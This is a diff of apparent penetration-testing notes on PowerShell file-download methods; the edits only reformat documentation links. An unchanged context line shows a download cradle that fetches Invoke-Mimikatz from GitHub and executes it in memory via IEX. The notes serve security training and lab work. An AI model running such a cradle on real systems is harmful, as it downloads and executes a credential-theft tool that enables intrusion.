@@ -11,7 +11,7 @@ Native File Downloads
 Windows File Transfer Methods that are available within powershell
 
 By using the `system.net.webclient
-methods <https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0>`__
+methods https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0
 
 Example 1: Download to Disk
 
@@ -33,7 +33,7 @@ Using the invoke Expression method:
    PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
 
 There is also a cmdlet like wget on Powershell called
-`invoke-WebRequest <invoke-WebRequest>`__
+:ref`invoke-WebRequest <invoke-WebRequest>`
 
 .. code-block:: console
 
@@ -60,4 +60,4 @@ will have to configure the server to accept invalid certs.
 References
 *************
 `Harmj0y powershell
-cradles <https://gist.github.com/HarmJ0y/bb48307ffa663256e239>`__
+cradles https://gist.github.com/HarmJ0y/bb48307ffa663256e239>
